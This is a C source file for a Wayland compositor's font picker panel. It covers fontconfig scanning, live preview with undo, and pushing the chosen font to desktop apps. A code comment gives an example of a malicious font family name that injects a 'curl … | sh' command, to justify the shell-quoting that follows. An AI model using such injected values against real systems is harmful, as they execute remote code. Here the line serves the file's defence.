/*
 * fontpick.c — the UI font picker panel
 *
 * synui drew every panel in whatever fontconfig calls "monospace" and there was
 * no way to change it short of editing fontconfig itself. This is the picker
 * for it, and the other half of the per-glyph fallback in text.c: that made the
 * compositor able to draw characters its font lacks, this makes the font a
 * choice.
 *
 * Modelled directly on cursor.c's curpick, down to the key handling, because a
 * third picker that worked a third way would be its own bug. State in the
 * server struct, drawn by synui_render_fontpick() in render.c, keys swallowed
 * while open, Esc backs out of the live preview.
 *
 * THE PREVIEW IS THE WHOLE PANEL
 *
 * Moving the selection calls syn_text_set_ui_font() and repaints, so the
 * picker's own title, footer and row labels are all redrawn in the candidate
 * font. That is deliberate: a specimen line rendered in a font tells you far
 * less than the actual UI rendered in it, and the failure this guards against —
 * picking something unreadable, or with no glyphs for the box drawing the rest
 * of the desktop uses — is only visible when the chrome itself changes.
 *
 * Which is also why Esc must restore. A font with no digits or no punctuation
 * makes every panel on the desktop unreadable, including this one, and a
 * preview you cannot back out of would then be unrecoverable without editing
 * the config file from a TTY.
 *
 * SCANNING
 *
 * FcFontList over FC_FAMILY, deduplicated. fontconfig reports a family once per
 * style (521 entries on the dev box for far fewer actual families), and it
 * reports localised aliases as separate strings, so the first name of each
 * pattern is taken and the rest dropped.
 *
 * Families with no Latin coverage are skipped. They are not hypothetical — a
 * box with Noto installed carries dozens of script-only faces, and a UI font
 * that cannot draw "Wallpaper" is never a useful answer to "what should the UI
 * be drawn in". They stay reachable through the fallback, which is where a
 * script font belongs.
 *
 * SynapseOS Project
 * SPDX-License-Identifier: GPL-2.0-or-later
 * https://github.com/velle999/SYNAPSE
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>

#include <fontconfig/fontconfig.h>
#include <wlr/types/wlr_damage_ring.h>
#include <wlr/util/log.h>

#include "synui.h"

/* ── Pushing a font change out ───────────────────────────────
 *
 * Damaging the outputs is not enough, and this is the same trap theme_apply()
 * documents one file over: the things that draw text into CACHED cairo buffers
 * keep the old font until something unrelated forces them to rebuild.
 *
 * Titlebars are cached on size/focus/title and a font change touches none of
 * those, so without the invalidation every open window keeps its caption in the
 * previous face. The dock's labels are one buffer over with the same problem.
 * Panels are not listed here because each one re-renders itself right after
 * calling this — the picker draws itself, and the others are closed while it is
 * open.
 */
static void fontpick_push(syn_server_t *s)
{
    for (int w = 0; w < WORKSPACE_MAX; w++) {
        syn_view_t *v;
        wl_list_for_each(v, &s->workspaces[w].windows, link)
            if (v->mapped) {
                view_invalidate_titlebar(v);
                view_update_decorations(v);
            }
    }
    dock_relayout(s);

    syn_output_t *o;
    wl_list_for_each(o, &s->outputs, link) {
        if (o->scene_output)
            wlr_damage_ring_add_whole(&o->scene_output->damage_ring);
        wlr_output_schedule_frame(o->wlr_output);
    }
}

/* ── Scan ────────────────────────────────────────────────── */

static int font_cmp(const void *a, const void *b)
{
    const struct syn_font_family *fa = a, *fb = b;
    return strcasecmp(fa->name, fb->name);
}

/* Does this family have the basic Latin a UI needs? Checked against the family
 * name rather than a loaded face because that is all FcFontList gives us
 * cheaply, and a charset query per family over ~500 families is the difference
 * between an instant panel and a visible stall. */
static bool family_has_latin(FcPattern *pat)
{
    FcCharSet *cs = NULL;
    if (FcPatternGetCharSet(pat, FC_CHARSET, 0, &cs) != FcResultMatch || !cs)
        return false;

    /* 'A', 'a', '0' and a space's neighbours. A face carrying all of these can
     * spell every label this compositor draws. */
    static const FcChar32 need[] = { 'A', 'Z', 'a', 'z', '0', '9', '.', '-' };
    for (unsigned i = 0; i < sizeof(need) / sizeof(need[0]); i++)
        if (!FcCharSetHasChar(cs, need[i]))
            return false;
    return true;
}

void fontpick_scan(syn_server_t *s)
{
    s->fontpick.count = 0;

    if (!FcInit()) {
        wlr_log(WLR_ERROR, "synui: fontpick: fontconfig init failed");
        return;
    }

    FcPattern   *pat = FcPatternCreate();
    FcObjectSet *os  = FcObjectSetBuild(FC_FAMILY, FC_CHARSET, FC_SPACING,
                                        (char *)NULL);
    if (!pat || !os) {
        if (pat) FcPatternDestroy(pat);
        if (os)  FcObjectSetDestroy(os);
        return;
    }

    FcFontSet *fs = FcFontList(NULL, pat, os);
    FcPatternDestroy(pat);
    FcObjectSetDestroy(os);
    if (!fs) return;

    for (int i = 0; i < fs->nfont && s->fontpick.count < FONTPICK_MAX; i++) {
        FcChar8 *fam = NULL;
        /* Index 0 only: fontconfig lists localised aliases as further values on
         * the same pattern ("Noto Sans" then the same name in another script),
         * and offering the same face several times under names the user cannot
         * tell apart is worse than offering it once. */
        if (FcPatternGetString(fs->fonts[i], FC_FAMILY, 0, &fam) != FcResultMatch
            || !fam || !*fam)
            continue;

        if (!family_has_latin(fs->fonts[i]))
            continue;

        /* Deduplicate: one entry per family, not per style. The list is not
         * sorted yet, so this is a linear scan — at FONTPICK_MAX it is a few
         * thousand strcasecmps once per panel open, which is not worth a hash
         * table that would then need clearing on every rescan. */
        bool seen = false;
        for (int j = 0; j < s->fontpick.count; j++)
            if (strcasecmp(s->fontpick.fonts[j].name, (const char *)fam) == 0) {
                seen = true;
                break;
            }
        if (seen) continue;

        snprintf(s->fontpick.fonts[s->fontpick.count].name,
                 sizeof(s->fontpick.fonts[0].name), "%s", (const char *)fam);

        /* Asked of fontconfig rather than guessed from the name, for
         * synui-apply-font(1)'s reason: "Hack" and "Adwaita Mono" are both
         * monospaced and only one says so, and "DejaVu Math TeX Gyre" is not
         * despite looking like it should be. Absent = proportional, which is
         * the safe direction: it warns about a font that might have been fine,
         * rather than staying quiet about one that is not. */
        int spacing = 0;
        s->fontpick.fonts[s->fontpick.count].mono =
            (FcPatternGetInteger(fs->fonts[i], FC_SPACING, 0, &spacing)
                 == FcResultMatch && spacing >= FC_MONO);

        s->fontpick.count++;
    }

    FcFontSetDestroy(fs);

    qsort(s->fontpick.fonts, (size_t)s->fontpick.count,
          sizeof(s->fontpick.fonts[0]), font_cmp);

    wlr_log(WLR_INFO, "synui: fontpick: %d font famil%s listed",
            s->fontpick.count, s->fontpick.count == 1 ? "y" : "ies");
}

/* ── Panel ───────────────────────────────────────────────── */

static void fontpick_scroll_to_selection(syn_server_t *s)
{
    if (s->fontpick.selected < s->fontpick.scroll)
        s->fontpick.scroll = s->fontpick.selected;
    if (s->fontpick.selected >= s->fontpick.scroll + FONTPICK_ROWS)
        s->fontpick.scroll = s->fontpick.selected - FONTPICK_ROWS + 1;
    if (s->fontpick.scroll < 0) s->fontpick.scroll = 0;
}

/* ── Row 0 is "Default" ──────────────────────────────────────
 *
 * The shipped default is "monospace", and monospace is a fontconfig ALIAS, not
 * a family — FcFontList never reports it, so it can never appear in the scanned
 * list. Without a row of its own the default is unrepresentable: opening the
 * picker would find no match for the active font and highlight row 0 anyway, so
 * the panel would claim you were on "Adwaita Mono" when you were not, and Enter
 * would then "confirm" a font you never chose.
 *
 * So the list is offset by one. Row 0 is the default and maps to NULL (which
 * syn_text_set_ui_font takes as "monospace"); every other row is
 * fonts[row - 1]. Every index that crosses this boundary goes through
 * fontpick_name(), so the offset is written down once.
 */
#define FONTPICK_DEFAULT_LABEL "Default (monospace)"

/* The family a row selects, or NULL for the default row. */
static const char *fontpick_name(syn_server_t *s, int row)
{
    if (row <= 0) return NULL;
    if (row - 1 >= s->fontpick.count) return NULL;
    return s->fontpick.fonts[row - 1].name;
}

/* Open on the row that is active, so reopening lands on the font you are
 * looking at rather than the top of an alphabetical list. */
static int fontpick_current_index(syn_server_t *s)
{
    const char *cur = syn_text_ui_font();
    if (!cur || !*cur || strcasecmp(cur, "monospace") == 0)
        return 0;
    for (int i = 0; i < s->fontpick.count; i++)
        if (strcasecmp(s->fontpick.fonts[i].name, cur) == 0)
            return i + 1;
    /* Set to something not in the list — a family from synuirc that has since
     * been uninstalled, or an alias like "sans-serif". Falling back to the
     * default row is the honest answer: it is the row whose behaviour matches
     * what is actually on screen, since fontconfig resolved that name to
     * whatever it resolves aliases to. */
    return 0;
}

int fontpick_total(syn_server_t *s)
{
    return s->fontpick.count + 1;   /* +1 for the default row */
}

/*
 * Will a terminal render properly in this row's family?
 *
 * The terminals follow whatever is picked — synui-apply-font(1) used to accept
 * only monospaced families and silently leave kitty alone otherwise, which read
 * as the font setting being broken. Letting it through means the picker owes
 * the user the warning instead, because the alternative feedback is opening a
 * terminal later and finding the columns no longer line up.
 *
 * Row 0 is the default, which IS "monospace" — so it never warns.
 */
int fontpick_row_is_mono(syn_server_t *s, int row)
{
    if (row <= 0) return 1;
    if (row - 1 >= s->fontpick.count) return 1;
    return s->fontpick.fonts[row - 1].mono;
}

void fontpick_row(syn_server_t *s, int row, const char **label)
{
    if (row == 0) { *label = FONTPICK_DEFAULT_LABEL; return; }
    const char *n = fontpick_name(s, row);
    *label = n ? n : "";
}

/* Apply row idx live, without persisting. Every panel currently on screen is
 * repainted, not just this one: the point of the preview is seeing the chrome
 * in the candidate font, and the control panel is usually the thing that opened
 * this. Not persisted per keypress for curpick's reason — arrowing through
 * forty families would write the state file forty times. */
static void fontpick_apply(syn_server_t *s, int idx)
{
    if (idx < 0 || idx >= fontpick_total(s)) return;
    syn_text_set_ui_font(fontpick_name(s, idx));   /* NULL on row 0 = default */
    fontpick_push(s);
}

void fontpick_show(syn_server_t *s)
{
    fontpick_scan(s);

    /* What was active on open, so Esc can put it back — see the header. */
    snprintf(s->fontpick.restore_font, sizeof(s->fontpick.restore_font), "%s",
             syn_text_ui_font());

    s->fontpick.visible  = 1;
    s->fontpick.selected = fontpick_current_index(s);
    s->fontpick.scroll   = 0;
    fontpick_scroll_to_selection(s);
    synui_render_fontpick(s);
}

void fontpick_hide(syn_server_t *s)
{
    s->fontpick.visible = 0;
    synui_render_fontpick(s);
    ctlpanel_child_closed(s, "font");
}

void fontpick_toggle(syn_server_t *s)
{
    if (s->fontpick.visible) fontpick_hide(s);
    else                     fontpick_show(s);
}

/* ── Out to the rest of the desktop ──────────────────────────
 *
 * The preview above only ever changes the font synui draws its own panels in,
 * and for one pkgrel that was the whole feature — so "set the UI font" left
 * every application on the desktop in whatever it was already using, which is
 * not what anyone asked for by picking a UI font. synui-apply-font(1) is the
 * other 90%: GTK 2/3/4, Qt/KDE, the bar, rofi and the terminal, plus the
 * re-assertion that keeps a theme switch from undoing it.
 *
 * On COMMIT only, never on preview. Arrowing down a list of five hundred
 * families would otherwise rewrite kdeglobals, four config files and a rofi
 * theme five hundred times, and SIGUSR1 every open terminal on the way past.
 */
static void fontpick_push_system(syn_server_t *s, const char *name)
{
    /* kdeglobals, the GTK files and every open terminal belong to the seat's
     * desktop; a headless or nested instance shares $HOME with it and would be
     * writing over somebody else's session. See synui_owns_seat(). */
    if (!synui_owns_seat(s)) {
        wlr_log(WLR_INFO, "synui: no seat (headless/nested) — not pushing the "
                          "UI font to the desktop's apps");
        return;
    }

    if (!name) {
        synui_spawn("synui-apply-font --default");
        return;
    }

    /* THE NAME IS UNTRUSTED — it is a font family, and families get here by
     * being unpacked from an archive off the internet into ~/.local/share/fonts
     * like any other file. synui_spawn() runs /bin/sh -c, so a family called
     *   Bad; curl http://… | sh
     * would execute the moment it was chosen. Same quoting as curpick_commit(),
     * for the same reason: single quotes make the shell take every byte
     * literally, and the '\'' dance is the only way to carry a literal single
     * quote through them. */
    char q[sizeof(((struct syn_font_family *)0)->name) * 4 + 32];
    size_t qi = 0;
    q[qi++] = '\'';
    for (size_t i = 0; name[i] && qi + 8 < sizeof(q); i++) {
        if (name[i] == '\'') {
            q[qi++] = '\''; q[qi++] = '\\'; q[qi++] = '\''; q[qi++] = '\'';
        } else {
            q[qi++] = name[i];
        }
    }
    q[qi++] = '\'';
    q[qi]   = '\0';

    char cmd[sizeof(q) + 32];
    snprintf(cmd, sizeof(cmd), "synui-apply-font %s", q);
    synui_spawn(cmd);
}

/* ── Size and scale ──────────────────────────────────────────
 *
 * Two more numbers in the same file, and NEITHER is a synui config key.
 *
 * That is the point. font.state is written by synui-apply-font(1) and read by
 * the bar, synfiles, syn-settings, syn-disks, syn-update, syn-arsenal and
 * synpkg; the text scale in particular is changed from synfiles' own settings
 * dialog. A copy of either number in synui's config would be a second source of
 * truth that silently wins the next time the control panel writes — which is
 * exactly the bug the scale was moved into font.state to fix. So the control
 * panel rows READ the file every time they are asked and WRITE through the
 * script, and synui stores neither.
 *
 *   size   a POINT size, for GTK/Qt/kitty/rofi — i.e. applications
 *   scale  a PERCENT, for the quickshell windows the suite draws itself
 *
 * They are separate settings and not two views of one, because a point size is
 * meaningless to a window that lays itself out in pixels. See the long comment
 * in synui-apply-font.sh.
 */
void fontpick_state_read(int *size, int *scale)
{
    /* The defaults the script uses when the file is absent, which is the normal
     * case until somebody picks a font. Duplicated from synui-apply-font.sh
     * because there is nothing to share them through — but a wrong answer here
     * can only mis-LABEL a row, never mis-write one: the script clamps and owns
     * the range, and the row writes an absolute value rather than a delta. */
    if (size)  *size  = 10;
    if (scale) *scale = 100;

    char path[256];
    syn_config_path(path, sizeof(path), "font.state");
    if (!path[0]) return;

    FILE *f = fopen(path, "re");
    if (!f) return;

    char line[256];
    while (fgets(line, sizeof(line), f)) {
        int v;
        if (size && sscanf(line, "size=%d", &v) == 1 && v > 0)
            *size = v;
        else if (scale && sscanf(line, "scale=%d", &v) == 1 && v > 0)
            *scale = v;
    }
    fclose(f);
}

/* Both take the same seat guard as fontpick_push_system(), and for the same
 * reason: --size rewrites kdeglobals, the GTK files and the terminals' configs,
 * which belong to the seat's desktop and not to a nested instance sharing its
 * $HOME. --scale only writes font.state, but that file is the seat's too.
 *
 * The values are plain integers formatted by us, so unlike the family they
 * carry no quoting problem — there is no path by which a digit becomes a shell
 * metacharacter. */
void fontpick_push_size(syn_server_t *s, int size)
{
    if (!synui_owns_seat(s)) {
        wlr_log(WLR_INFO, "synui: no seat (headless/nested) — not pushing the "
                          "UI font size to the desktop's apps");
        return;
    }
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "synui-apply-font --size %d", size);
    synui_spawn(cmd);
}

void fontpick_push_scale(syn_server_t *s, int scale)
{
    if (!synui_owns_seat(s)) {
        wlr_log(WLR_INFO, "synui: no seat (headless/nested) — not writing the "
                          "text scale");
        return;
    }
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "synui-apply-font --scale %d", scale);
    synui_spawn(cmd);
}

/* Commit the highlighted family: persist it so it survives a restart, keep
 * config.ui_font in step so anything reading the config sees the same answer,
 * and push it out to the toolkits.
 *
 * settings.state rather than rewriting synuirc, exactly as every other panel
 * does — it is applied after synuirc and so overrides it, and deleting it hands
 * control back to the config file. */
static void fontpick_commit(syn_server_t *s)
{
    int idx = s->fontpick.selected;
    if (idx < 0 || idx >= fontpick_total(s)) { fontpick_hide(s); return; }

    const char *name = fontpick_name(s, idx);
    fontpick_push_system(s, name);

    if (!name) {
        /* The default row. CLEARED from settings.state rather than written as
         * the literal "monospace": an absent key hands control back to synuirc,
         * which is how every other state file in this tree behaves, whereas a
         * written value would pin the UI font against a `ui_font =` line the
         * user might later add. */
        s->config.ui_font[0] = '\0';
        syn_text_set_ui_font(NULL);
        settings_state_clear("ui_font");
        wlr_log(WLR_INFO, "synui: fontpick: UI font reset to the default");
    } else {
        snprintf(s->config.ui_font, sizeof(s->config.ui_font), "%s", name);
        syn_text_set_ui_font(name);
        settings_state_set("ui_font", name);
        wlr_log(WLR_INFO, "synui: fontpick: UI font set to '%s'%s", name,
                fontpick_row_is_mono(s, idx)
                    ? ""
                    : " (not monospaced: the terminals get it anyway and may"
                      " not render correctly)");
    }

    fontpick_hide(s);
    fontpick_push(s);
}

/* Back out to whatever was active when the panel opened. Not optional: see the
 * header — a font with no digits makes every panel on the desktop unreadable,
 * this one included. */
static void fontpick_cancel(syn_server_t *s)
{
    if (strcmp(s->fontpick.restore_font, syn_text_ui_font()) != 0) {
        syn_text_set_ui_font(s->fontpick.restore_font);
        fontpick_push(s);
    }
    fontpick_hide(s);
}

/* ── Pointer ─────────────────────────────────────────────────
 *
 * The panel pointer contract in synui.h, mirroring curpick: one click previews
 * (the arrow keys' job), a double click commits (Enter's), same 400ms window,
 * and a click off the panel is Esc. */

int fontpick_motion(syn_server_t *s, double lx, double ly)
{
    (void)lx; (void)ly;
    /* No hover preview. Moving the selection repaints every panel in a new
     * font, and doing that to each row the pointer crosses would strobe the
     * whole desktop on the way down the list. */
    return s->fontpick.visible ? 1 : 0;
}

int fontpick_click(syn_server_t *s, double lx, double ly, uint32_t button,
                   uint32_t time_msec)
{
    if (!s->fontpick.visible) return 0;

    if (!hit_in_panel(&s->fontpick.hit, lx, ly)) {
        fontpick_cancel(s);
        return 1;
    }
    if (button != BTN_LEFT) return 1;

    int i = hit_index_at(&s->fontpick.hit, lx, ly);
    if (i < 0 || i >= fontpick_total(s)) return 1;

    bool dbl = (s->fontpick.last_click_row == i) &&
               (time_msec - s->fontpick.last_click_ms < 400);
    s->fontpick.last_click_row = dbl ? -1 : i;
    s->fontpick.last_click_ms  = time_msec;

    s->fontpick.selected = i;
    fontpick_scroll_to_selection(s);
    fontpick_apply(s, i);

    if (dbl) fontpick_commit(s);
    else     synui_render_fontpick(s);
    return 1;
}

int fontpick_scroll(syn_server_t *s, double lx, double ly, double delta)
{
    if (!s->fontpick.visible) return 0;
    if (!hit_in_panel(&s->fontpick.hit, lx, ly)) return 1;

    int step = delta > 0 ? 1 : -1;
    s->fontpick.scroll += step;

    int max = fontpick_total(s) - FONTPICK_ROWS;
    if (max < 0) max = 0;
    if (s->fontpick.scroll > max) s->fontpick.scroll = max;
    if (s->fontpick.scroll < 0)   s->fontpick.scroll = 0;

    synui_render_fontpick(s);
    return 1;
}

/* ── Keys ────────────────────────────────────────────────────
 *
 * filters.c/power.c/curpick's set: Up/Down (j/k) move, Enter commits, Esc
 * cancels, r rescans. Returns 1 when the key was swallowed. */
int fontpick_key(syn_server_t *s, xkb_keysym_t sym, uint32_t mods)
{
    (void)mods;
    if (!s->fontpick.visible) return 0;

    switch (sym) {
    case XKB_KEY_Escape:
    case XKB_KEY_q:
        fontpick_cancel(s);
        return 1;

    case XKB_KEY_Return:
    case XKB_KEY_KP_Enter:
        fontpick_commit(s);
        return 1;

    case XKB_KEY_Up:
    case XKB_KEY_k:
        if (s->fontpick.selected > 0) s->fontpick.selected--;
        fontpick_scroll_to_selection(s);
        fontpick_apply(s, s->fontpick.selected);
        synui_render_fontpick(s);
        return 1;

    case XKB_KEY_Down:
    case XKB_KEY_j:
        if (s->fontpick.selected < fontpick_total(s) - 1) s->fontpick.selected++;
        fontpick_scroll_to_selection(s);
        fontpick_apply(s, s->fontpick.selected);
        synui_render_fontpick(s);
        return 1;

    case XKB_KEY_Page_Up:
        s->fontpick.selected -= FONTPICK_ROWS;
        if (s->fontpick.selected < 0) s->fontpick.selected = 0;
        fontpick_scroll_to_selection(s);
        fontpick_apply(s, s->fontpick.selected);
        synui_render_fontpick(s);
        return 1;

    case XKB_KEY_Page_Down:
        s->fontpick.selected += FONTPICK_ROWS;
        if (s->fontpick.selected > fontpick_total(s) - 1)
            s->fontpick.selected = fontpick_total(s) - 1;
        if (s->fontpick.selected < 0) s->fontpick.selected = 0;
        fontpick_scroll_to_selection(s);
        fontpick_apply(s, s->fontpick.selected);
        synui_render_fontpick(s);
        return 1;

    case XKB_KEY_Home:
        s->fontpick.selected = 0;
        fontpick_scroll_to_selection(s);
        fontpick_apply(s, s->fontpick.selected);
        synui_render_fontpick(s);
        return 1;

    case XKB_KEY_End:
        s->fontpick.selected = fontpick_total(s) - 1;
        if (s->fontpick.selected < 0) s->fontpick.selected = 0;
        fontpick_scroll_to_selection(s);
        fontpick_apply(s, s->fontpick.selected);
        synui_render_fontpick(s);
        return 1;

    /* Back to the shipped default without hunting for it in an alphabetical
     * list of five hundred — and the one row that is guaranteed to be legible,
     * which matters when the preview has made the panel hard to read. */
    case XKB_KEY_d:
        syn_text_set_ui_font(NULL);
        s->fontpick.selected = fontpick_current_index(s);
        fontpick_scroll_to_selection(s);
        fontpick_push(s);
        synui_render_fontpick(s);
        return 1;

    case XKB_KEY_r:
        fontpick_scan(s);
        s->fontpick.selected = fontpick_current_index(s);
        fontpick_scroll_to_selection(s);
        synui_render_fontpick(s);
        return 1;

    default:
        /* Modal: swallow everything else rather than letting it reach the
         * window underneath, as every other picker does. */
        return 1;
    }
}
